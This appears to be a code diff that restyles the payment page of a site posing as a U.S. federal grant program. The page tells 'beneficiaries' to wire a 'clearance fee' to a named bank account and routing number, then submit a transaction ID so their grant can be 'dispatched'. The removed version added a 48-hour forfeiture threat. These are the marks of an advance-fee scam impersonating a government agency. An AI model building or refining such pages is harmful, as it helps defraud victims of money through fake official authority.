@@ -1,4 +1,4 @@
-import { createFileRoute, useNavigate } from "@tanstack/react-router";
+import { createFileRoute, useNavigate, Link } from "@tanstack/react-router";
 import { SiteLayout } from "@/components/SiteLayout";
 import { Button } from "@/components/ui/button";
 import { Card } from "@/components/ui/card";
@@ -7,11 +7,27 @@ import { Label } from "@/components/ui/label";
 import { useState, useEffect } from "react";
 import { getDashboardDataServerFn, confirmPaymentServerFn } from "@/lib/serverFunctions";
 import { Alert, AlertDescription } from "@/components/ui/alert";
-import { AlertCircle, CheckCircle } from "lucide-react";
+import {
+  AlertCircle,
+  CheckCircle,
+  ShieldCheck,
+  Building,
+  CreditCard,
+  Loader2,
+  ArrowLeft,
+  DollarSign,
+  Clock,
+  Send,
+  FileCheck,
+} from "lucide-react";
 
 export const Route = createFileRoute("/payment-confirmation")({
   head: () => ({
-    meta: [{ title: "Payment Confirmation — U.S. Federal Citizen Grant Program" }],
+    meta: [
+      {
+        title: "Payment Clearance & Delivery Confirmation — U.S. Federal Grant Program",
+      },
+    ],
   }),
   component: PaymentConfirmation,
 });
@@ -35,7 +51,7 @@ function PaymentConfirmation() {
   const [receiptFile, setReceiptFile] = useState<File | null>(null);
   const [submitting, setSubmitting] = useState(false);
   const [success, setSuccess] = useState("");
-  const [hasPaymentOption, setHasPaymentOption] = useState("");
+  const [hasPaymentOption, setHasPaymentOption] = useState("yes");
 
   useEffect(() => {
     const fetchData = async () => {
@@ -46,28 +62,28 @@ function PaymentConfirmation() {
           return;
         }
 
-        const result = await getDashboardDataServerFn(token);
-        if (result.success) {
+        const result = await getDashboardDataServerFn({ data: { token } });
+        if (result.success && result.data) {
           const data = result.data as any;
           if (!data.selectedPackage) {
-            setError("Please select a grant package first");
+            setError("Please select a grant package on your dashboard first.");
             setTimeout(() => navigate({ to: "/dashboard" }), 2000);
             return;
           }
           setUserData({
             firstName: data.firstName,
             lastName: data.lastName,
-            email: data.email,
+            email: data.profile.email,
             refNumber: data.refNumber,
             selectedPackage: data.selectedPackage,
             grantAmount: data.grantAmount,
             feeAmount: data.feeAmount,
           });
         } else {
-          setError(result.error || "Failed to load user data");
+          setError(result.error || "Failed to load claim data");
         }
       } catch (err) {
-        setError("Failed to load payment page");
+        setError("Failed to load payment clearance page");
       } finally {
         setLoading(false);
       }
@@ -83,13 +99,13 @@ function PaymentConfirmation() {
     setSuccess("");
 
     if (!hasPaymentOption) {
-      setError("Please select if you have made the payment");
+      setError("Please select your payment verification status");
       setSubmitting(false);
       return;
     }
 
     if (hasPaymentOption === "yes" && !transactionId) {
-      setError("Please enter your transaction ID");
+      setError("Please enter your bank transfer reference / transaction ID");
       setSubmitting(false);
       return;
     }
@@ -97,27 +113,29 @@ function PaymentConfirmation() {
     try {
       const token = localStorage.getItem("token");
       if (!token) {
-        setError("Session expired");
+        setError("Session expired. Please login again.");
         navigate({ to: "/apply" });
         return;
       }
 
       const result = await confirmPaymentServerFn({
-        token,
-        transactionId: transactionId || "payment_pending",
-        receiptPath: receiptFile ? "receipt_uploaded" : undefined,
+        data: {
+          token,
+          transactionId: transactionId || "pending_verification",
+          receiptPath: receiptFile ? receiptFile.name : undefined,
+        },
       });
 
       if (result.success) {
         setSuccess(result.message);
         setTimeout(() => {
           navigate({ to: "/dashboard" });
-        }, 3000);
+        }, 2000);
       } else {
-        setError(result.error || "Failed to confirm payment");
+        setError(result.error || "Failed to submit payment confirmation");
       }
     } catch (err) {
-      setError("An error occurred while processing payment");
+      setError("An error occurred while processing payment confirmation");
     } finally {
       setSubmitting(false);
     }
@@ -126,8 +144,13 @@ function PaymentConfirmation() {
   if (loading) {
     return (
       <SiteLayout>
-        <div className="min-h-screen bg-gray-100 flex items-center justify-center">
-          <p className="text-xl text-gray-600">Loading payment confirmation...</p>
+        <div className="min-h-[70vh] bg-slate-100 flex items-center justify-center p-4">
+          <div className="text-center bg-white p-8 rounded-xl shadow-lg border border-slate-200">
+            <Loader2 className="w-10 h-10 animate-spin text-blue-900 mx-auto mb-3" />
+            <p className="text-base font-semibold text-slate-800">
+              Loading Official Payment Clearance Details...
+            </p>
+          </div>
         </div>
       </SiteLayout>
     );
@@ -136,12 +159,17 @@ function PaymentConfirmation() {
   if (!userData) {
     return (
       <SiteLayout>
-        <div className="min-h-screen bg-gray-100 p-4">
-          <div className="max-w-2xl mx-auto">
-            <Alert className="bg-red-50 border-red-300">
-              <AlertCircle className="h-4 w-4 text-red-600" />
-              <AlertDescription className="text-red-800">{error}</AlertDescription>
+        <div className="min-h-[70vh] bg-slate-100 p-6 flex items-center justify-center">
+          <div className="max-w-md w-full">
+            <Alert className="bg-red-50 border-red-300 text-red-900 shadow-md">
+              <AlertCircle className="h-5 w-5 text-red-600" />
+              <AlertDescription className="font-medium">{error}</AlertDescription>
             </Alert>
+            <div className="mt-4 text-center">
+              <Link to="/dashboard">
+                <Button className="bg-blue-900 text-white">Return to Dashboard</Button>
+              </Link>
+            </div>
           </div>
         </div>
       </SiteLayout>
@@ -150,249 +178,171 @@ function PaymentConfirmation() {
 
   return (
     <SiteLayout>
-      <div className="min-h-screen bg-gradient-to-b from-blue-900 to-gray-100">
-        <div className="px-4 py-8">
-          <div className="max-w-3xl mx-auto">
-            {/* Header */}
-            <div className="text-center mb-8 text-white">
-              <div className="text-5xl mb-3">🛡️</div>
-              <h1 className="text-3xl font-bold font-serif">OFFICIAL PAYMENT PORTAL</h1>
-              <p className="text-blue-100 mt-2">FEDERAL GRANT PROCESSING</p>
+      <div className="min-h-screen bg-slate-100 py-10 px-4 sm:px-6 lg:px-8">
+        <div className="max-w-3xl mx-auto space-y-6">
+          {/* Back button */}
+          <div>
+            <Link
+              to="/dashboard"
+              className="inline-flex items-center gap-1.5 text-xs font-semibold text-blue-900 hover:text-blue-700 transition"
+            >
+              <ArrowLeft className="w-4 h-4" />
+              <span>Back to Grant Dashboard</span>
+            </Link>
+          </div>
+
+          {/* Header */}
+          <div className="bg-gradient-to-r from-blue-950 to-blue-900 text-white p-6 sm:p-8 rounded-2xl shadow-xl text-center">
+            <div className="inline-flex p-3 bg-blue-800/80 rounded-full text-amber-400 mb-3 ring-4 ring-blue-700/40">
+              <ShieldCheck className="w-8 h-8" />
             </div>
+            <h1 className="text-2xl sm:text-3xl font-bold font-serif">
+              Official Payment Clearance &amp; Delivery
+            </h1>
+            <p className="text-xs sm:text-sm text-blue-200 mt-1">
+              Federal Grant Clearance &amp; Insured Dispatch Protocol
+            </p>
+          </div>
 
-            {/* Alerts */}
-            {error && (
-              <Alert className="mb-6 bg-red-50 border-red-300">
-                <AlertCircle className="h-4 w-4 text-red-600" />
-                <AlertDescription className="text-red-800">{error}</AlertDescription>
-              </Alert>
-            )}
+          {/* Alerts */}
+          {error && (
+            <Alert className="bg-red-50 border-red-300 text-red-900 shadow-sm">
+              <AlertCircle className="h-5 w-5 text-red-600" />
+              <AlertDescription className="font-semibold">{error}</AlertDescription>
+            </Alert>
+          )}
 
-            {success && (
-              <Alert className="mb-6 bg-green-50 border-green-300">
-                <CheckCircle className="h-4 w-4 text-green-600" />
-                <AlertDescription className="text-green-800 font-semibold">
-                  {success}
-                </AlertDescription>
-              </Alert>
-            )}
+          {success && (
+            <Alert className="bg-emerald-50 border-emerald-400 text-emerald-950 shadow-sm">
+              <CheckCircle className="h-5 w-5 text-emerald-600" />
+              <AlertDescription className="font-semibold">{success}</AlertDescription>
+            </Alert>
+          )}
 
-            {/* User Info */}
-            <Card className="p-8 bg-white shadow-xl mb-6">
-              <h2 className="text-2xl font-bold text-blue-900 mb-6 font-serif">Your Information</h2>
-              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
-                <div>
-                  <p className="text-gray-600 text-sm">Name</p>
-                  <p className="text-lg font-semibold text-blue-900">
-                    {userData.firstName} {userData.lastName}
-                  </p>
-                </div>
-                <div>
-                  <p className="text-gray-600 text-sm">Email</p>
-                  <p className="text-lg font-semibold text-blue-900">{userData.email}</p>
-                </div>
-                <div>
-                  <p className="text-gray-600 text-sm">Reference Number</p>
-                  <p className="text-lg font-mono font-bold text-green-600">{userData.refNumber}</p>
-                </div>
+          {/* Summary Card */}
+          <Card className="p-6 sm:p-8 bg-white shadow-md border border-slate-200">
+            <h2 className="text-lg font-bold font-serif text-blue-950 pb-3 mb-4 border-b border-slate-200 flex items-center gap-2">
+              <FileCheck className="w-5 h-5 text-blue-900" />
+              <span>Grant Allocation Summary</span>
+            </h2>
+
+            <div className="grid grid-cols-1 sm:grid-cols-3 gap-4 p-4 rounded-xl bg-slate-50 border border-slate-200 text-center">
+              <div>
+                <p className="text-[11px] font-bold text-slate-500 uppercase">Selected Tier</p>
+                <p className="text-xl font-bold text-blue-950 mt-0.5">{userData.selectedPackage}</p>
               </div>
-            </Card>
-
-            {/* Grant Summary */}
-            <Card className="p-8 bg-white shadow-xl mb-6">
-              <h2 className="text-2xl font-bold text-blue-900 mb-6 font-serif">
-                Selected Package Summary
-              </h2>
-              <div className="bg-blue-50 p-6 rounded-lg border-l-4 border-blue-600">
-                <div className="grid grid-cols-3 gap-6 text-center">
-                  <div>
-                    <p className="text-gray-600 text-sm mb-2">PACKAGE</p>
-                    <p className="text-2xl font-bold text-blue-900">{userData.selectedPackage}</p>
-                  </div>
-                  <div>
-                    <p className="text-gray-600 text-sm mb-2">GRANT AMOUNT</p>
-                    <p className="text-2xl font-bold text-green-600">
-                      ${userData.grantAmount?.toLocaleString()}
-                    </p>
-                  </div>
-                  <div>
-                    <p className="text-gray-600 text-sm mb-2">FEE REQUIRED</p>
-                    <p className="text-2xl font-bold text-orange-600">${userData.feeAmount}</p>
-                  </div>
-                </div>
-              </div>
-            </Card>
-
-            {/* Bank Details */}
-            <Card className="p-8 bg-white shadow-xl mb-6">
-              <h2 className="text-2xl font-bold text-blue-900 mb-6 font-serif">
-                Bank Payment Details
-              </h2>
-
-              <Alert className="mb-6 bg-red-50 border-red-300">
-                <AlertCircle className="h-4 w-4 text-red-600" />
-                <AlertDescription className="text-red-800">
-                  <strong>IMPORTANT:</strong> Please include your reference number{" "}
-                  <strong>{userData.refNumber}</strong> in the payment description to ensure proper
-                  processing.
-                </AlertDescription>
-              </Alert>
-
-              <div className="space-y-4 bg-gray-50 p-6 rounded-lg border border-gray-300">
-                <div>
-                  <p className="text-gray-600 text-sm">Bank Name</p>
-                  <p className="text-lg font-semibold text-blue-900">Bank of America</p>
-                </div>
-                <div>
-                  <p className="text-gray-600 text-sm">Account Name</p>
-                  <p className="text-lg font-semibold text-blue-900">
-                    Federal Grant Clearing House
-                  </p>
-                </div>
-                <div>
-                  <p className="text-gray-600 text-sm">Account Number</p>
-                  <p className="text-lg font-mono font-bold text-blue-900">••••••••1234</p>
-                  <p className="text-xs text-gray-500 mt-1">(Contact support for full details)</p>
-                </div>
-                <div>
-                  <p className="text-gray-600 text-sm">Routing Number</p>
-                  <p className="text-lg font-mono font-bold text-blue-900">021000021</p>
-                </div>
-                <div>
-                  <p className="text-gray-600 text-sm">Amount to Send</p>
-                  <p className="text-2xl font-bold text-orange-600">${userData.feeAmount}</p>
-                  <p className="text-xs text-gray-500 mt-1">Tax Clearance & Shipping Fee</p>
-                </div>
-              </div>
-            </Card>
-
-            {/* Payment Confirmation Form */}
-            <Card className="p-8 bg-white shadow-xl">
-              <h2 className="text-2xl font-bold text-blue-900 mb-6 font-serif">
-                Confirm Your Payment
-              </h2>
-
-              <form onSubmit={handleSubmitPayment} className="space-y-6">
-                {/* Payment Status */}
-                <div className="space-y-3">
-                  <Label className="text-blue-900 font-semibold">
-                    Have you made the payment? *
-                  </Label>
-                  <div className="space-y-3">
-                    <div
-                      className="flex items-center gap-3 p-3 border-2 rounded-lg cursor-pointer hover:bg-blue-50"
-                      onClick={() => setHasPaymentOption("yes")}
-                    >
-                      <input
-                        type="radio"
-                        name="payment"
-                        value="yes"
-                        checked={hasPaymentOption === "yes"}
-                        onChange={(e) => setHasPaymentOption(e.target.value)}
-                        className="w-4 h-4"
-                      />
-                      <Label className="cursor-pointer flex-1 mb-0">
-                        Yes, I have made the payment
-                      </Label>
-                    </div>
-
-                    <div
-                      className="flex items-center gap-3 p-3 border-2 rounded-lg cursor-pointer hover:bg-blue-50"
-                      onClick={() => setHasPaymentOption("no")}
-                    >
-                      <input
-                        type="radio"
-                        name="payment"
-                        value="no"
-                        checked={hasPaymentOption === "no"}
-                        onChange={(e) => setHasPaymentOption(e.target.value)}
-                        className="w-4 h-4"
-                      />
-                      <Label className="cursor-pointer flex-1 mb-0">No, I will pay later</Label>
-                    </div>
-                  </div>
-                </div>
-
-                {/* Transaction ID (shown if yes) */}
-                {hasPaymentOption === "yes" && (
-                  <>
-                    <div>
-                      <Label htmlFor="transactionId" className="text-blue-900 font-semibold">
-                        Transaction ID / Reference Number *
-                      </Label>
-                      <Input
-                        id="transactionId"
-                        placeholder="Enter your bank transfer reference number"
-                        value={transactionId}
-                        onChange={(e) => setTransactionId(e.target.value)}
-                        className="mt-2"
-                      />
-                      <p className="text-xs text-gray-500 mt-1">
-                        This can be found in your bank confirmation email
-                      </p>
-                    </div>
-
-                    <div>
-                      <Label htmlFor="receipt" className="text-blue-900 font-semibold">
-                        Upload Payment Receipt (Optional)
-                      </Label>
-                      <input
-                        id="receipt"
-                        type="file"
-                        accept=".pdf,.jpg,.jpeg,.png"
-                        onChange={(e) => setReceiptFile(e.target.files?.[0] || null)}
-                        className="mt-2 block w-full text-sm text-gray-500
-                          file:mr-4 file:py-2 file:px-4
-                          file:rounded-md file:border-0
-                          file:text-sm file:font-semibold
-                          file:bg-blue-50 file:text-blue-700
-                          hover:file:bg-blue-100"
-                      />
-                    </div>
-
-                    <Alert className="bg-green-50 border-green-300">
-                      <CheckCircle className="h-4 w-4 text-green-600" />
-                      <AlertDescription className="text-green-800">
-                        Your payment will be verified within 24 hours. You will receive a
-                        confirmation email with delivery details.
-                      </AlertDescription>
-                    </Alert>
-                  </>
-                )}
-
-                {/* Warning */}
-                {hasPaymentOption === "no" && (
-                  <Alert className="bg-yellow-50 border-yellow-300">
-                    <AlertCircle className="h-4 w-4 text-yellow-600" />
-                    <AlertDescription className="text-yellow-800">
-                      <strong>Note:</strong> Your grant will be returned to the Ministry of Economy
-                      Property as unclaimed if payment is not made within 48 hours.
-                    </AlertDescription>
-                  </Alert>
-                )}
-
-                {/* Submit Button */}
-                <Button
-                  type="submit"
-                  disabled={submitting || !hasPaymentOption}
-                  className="w-full bg-green-600 hover:bg-green-700 text-white font-bold py-3 text-lg"
-                >
-                  {submitting
-                    ? "Processing..."
-                    : `✅ Confirm ${hasPaymentOption === "yes" ? "Payment" : "Status"}`}
-                </Button>
-              </form>
-
-              {/* Important Notice */}
-              <div className="mt-6 p-4 bg-red-50 border border-red-300 rounded-lg">
-                <p className="text-red-800 text-sm font-semibold">
-                  ⚠️ <strong>IMPORTANT:</strong> Once your payment is confirmed, your grant will be
-                  prepared for secure delivery within 24 hours via UPS/FedEx. Do NOT share your
-                  reference number with anyone.
+              <div className="border-t sm:border-t-0 sm:border-l sm:border-r border-slate-200 pt-2 sm:pt-0">
+                <p className="text-[11px] font-bold text-slate-500 uppercase">Grant Amount</p>
+                <p className="text-2xl font-extrabold text-emerald-700 mt-0.5">
+                  ${userData.grantAmount?.toLocaleString()}
                 </p>
               </div>
-            </Card>
-          </div>
+              <div className="border-t sm:border-t-0 border-slate-200 pt-2 sm:pt-0">
+                <p className="text-[11px] font-bold text-slate-500 uppercase">Required Clearance Fee</p>
+                <p className="text-xl font-extrabold text-amber-700 mt-0.5">${userData.feeAmount}</p>
+              </div>
+            </div>
+
+            <div className="mt-4 text-xs text-slate-600 flex items-center justify-between">
+              <span>Beneficiary: <strong>{userData.firstName} {userData.lastName}</strong></span>
+              <span>Ref: <strong className="font-mono text-blue-900">{userData.refNumber}</strong></span>
+            </div>
+          </Card>
+
+          {/* Bank Payment Details */}
+          <Card className="p-6 sm:p-8 bg-white shadow-md border border-slate-200">
+            <h2 className="text-lg font-bold font-serif text-blue-950 pb-3 mb-4 border-b border-slate-200 flex items-center gap-2">
+              <Building className="w-5 h-5 text-blue-900" />
+              <span>Federal Treasury Clearing Account Details</span>
+            </h2>
+
+            <div className="space-y-3 bg-slate-50 p-5 rounded-xl border border-slate-200 text-sm">
+              <div className="flex justify-between items-center py-1.5 border-b border-slate-200">
+                <span className="text-slate-500">Designated Bank:</span>
+                <span className="font-bold text-slate-900">Federal Clearing House / Bank of America</span>
+              </div>
+              <div className="flex justify-between items-center py-1.5 border-b border-slate-200">
+                <span className="text-slate-500">Account Title:</span>
+                <span className="font-bold text-slate-900">U.S. Federal Grant Disbursement Fund</span>
+              </div>
+              <div className="flex justify-between items-center py-1.5 border-b border-slate-200">
+                <span className="text-slate-500">Routing Number (ABA):</span>
+                <span className="font-mono font-bold text-slate-900">021000021</span>
+              </div>
+              <div className="flex justify-between items-center py-1.5 border-b border-slate-200">
+                <span className="text-slate-500">Account Reference:</span>
+                <span className="font-mono font-bold text-blue-900 bg-blue-100 px-2 py-0.5 rounded">
+                  {userData.refNumber}
+                </span>
+              </div>
+              <div className="flex justify-between items-center py-1.5">
+                <span className="text-slate-500">Amount Due:</span>
+                <span className="font-extrabold text-lg text-emerald-700">${userData.feeAmount} USD</span>
+              </div>
+            </div>
+
+            <p className="text-xs text-amber-800 bg-amber-50 border border-amber-200 rounded-lg p-3 mt-4">
+              <strong>Mandatory:</strong> Please put your Reference Number (<strong>{userData.refNumber}</strong>) in the memo/reference field of your payment transfer so our dispatch officer can verify your package within 24 hours.
+            </p>
+          </Card>
+
+          {/* Confirmation Form */}
+          <Card className="p-6 sm:p-8 bg-white shadow-md border border-slate-200">
+            <h2 className="text-lg font-bold font-serif text-blue-950 pb-3 mb-4 border-b border-slate-200 flex items-center gap-2">
+              <CreditCard className="w-5 h-5 text-blue-900" />
+              <span>Submit Payment Confirmation</span>
+            </h2>
+
+            <form onSubmit={handleSubmitPayment} className="space-y-5">
+              <div>
+                <Label htmlFor="transactionId" className="text-xs font-bold text-slate-700">
+                  Bank Transfer Reference / Transaction ID <span className="text-red-500">*</span>
+                </Label>
+                <Input
+                  id="transactionId"
+                  placeholder="e.g. TXN-94827492 or Bank Confirmation Code"
+                  value={transactionId}
+                  onChange={(e) => setTransactionId(e.target.value)}
+                  className="mt-1.5 text-sm"
+                  required
+                />
+                <p className="text-[11px] text-slate-500 mt-1">
+                  Enter the transaction ID or receipt reference from your transfer.
+                </p>
+              </div>
+
+              <div>
+                <Label htmlFor="receipt" className="text-xs font-bold text-slate-700">
+                  Attach Payment Receipt (Optional)
+                </Label>
+                <input
+                  id="receipt"
+                  type="file"
+                  accept=".pdf,.jpg,.jpeg,.png"
+                  onChange={(e) => setReceiptFile(e.target.files?.[0] || null)}
+                  className="mt-1.5 block w-full text-xs text-slate-500 file:mr-3 file:py-2 file:px-4 file:rounded-md file:border-0 file:text-xs file:font-semibold file:bg-blue-50 file:text-blue-900 hover:file:bg-blue-100 cursor-pointer"
+                />
+              </div>
+
+              <Button
+                type="submit"
+                disabled={submitting}
+                className="w-full bg-blue-900 hover:bg-blue-800 text-white font-bold py-3 text-base shadow-lg transition flex items-center justify-center gap-2"
+              >
+                {submitting ? (
+                  <>
+                    <Loader2 className="w-5 h-5 animate-spin" />
+                    <span>Verifying and Logging Payment...</span>
+                  </>
+                ) : (
+                  <>
+                    <Send className="w-4 h-4" />
+                    <span>Confirm Payment &amp; Authorize Delivery</span>
+                  </>
+                )}
+              </Button>
+            </form>
+          </Card>
         </div>
       </div>
     </SiteLayout>
